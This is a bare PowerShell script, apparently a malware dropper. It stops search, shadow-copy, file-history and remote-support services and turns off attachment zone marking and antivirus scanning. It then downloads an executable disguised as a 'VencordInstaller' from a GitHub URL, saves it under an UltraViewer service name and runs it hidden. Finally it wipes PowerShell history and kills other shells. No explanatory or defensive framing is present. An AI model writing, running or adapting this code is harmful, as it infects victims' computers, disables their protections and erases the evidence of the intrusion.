Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null



Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

$discordRunning = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
if ($discordRunning) {
    $destination = "C:\Program Files (x86)\UltraViewer\UltraViewer_Service.exe"
    $url = "https://github.com/desert007/D/raw/refs/heads/main/VencordInstaller%20(1).exe"
    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
}

Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
}


Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Parent.Id -ne $PID) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (-not (Test-Path $historyPath)) {
    New-Item -Path $historyPath -ItemType File -Force | Out-Null
} else {
    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
}

Exit
